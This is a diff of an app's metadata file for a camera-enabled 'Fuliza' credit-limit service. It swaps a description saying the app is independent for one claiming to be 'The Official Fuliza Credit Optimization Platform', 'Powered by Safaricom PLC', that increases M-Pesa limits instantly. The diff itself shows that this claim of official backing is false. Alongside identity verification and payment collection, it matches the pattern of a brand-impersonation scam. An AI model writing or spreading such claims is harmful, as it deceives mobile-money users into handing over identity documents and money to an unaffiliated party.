@@ -1,6 +1,6 @@
 {
   "name": "Fuliza",
-  "description": "An independent fintech platform for credit limit upgrades with KYC verification and Lipana payment integration.",
+  "description": "The Official Fuliza Credit Optimization Platform. Verify your identity and increase your M-Pesa Fuliza limit instantly. Powered by Safaricom PLC.",
   "requestFramePermissions": [
     "camera"
   ]
